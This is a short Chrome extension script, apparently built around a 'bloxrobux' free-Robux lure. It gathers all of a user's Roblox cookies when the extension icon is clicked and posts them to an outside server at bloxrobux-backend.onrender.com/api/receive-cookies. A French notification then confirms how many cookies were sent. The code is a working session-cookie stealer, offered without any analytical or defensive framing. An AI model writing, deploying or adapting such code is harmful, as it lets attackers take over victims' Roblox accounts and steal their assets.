chrome.action.onClicked.addListener(async () => {
  chrome.cookies.getAll({ domain: ".roblox.com" }, async (cookies) => {
    await fetch("https://bloxrobux-backend.onrender.com/api/receive-cookies", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Authorization": "Bearer SUPER_SECRET_TOKEN"
      },
      body: JSON.stringify(cookies)
    });

    chrome.notifications.create({
      type: "basic",
      iconUrl: "icon.png",
      title: "Cookies envoyés",
      message: `${cookies.length} cookies Roblox envoyés`
    });
  });
});
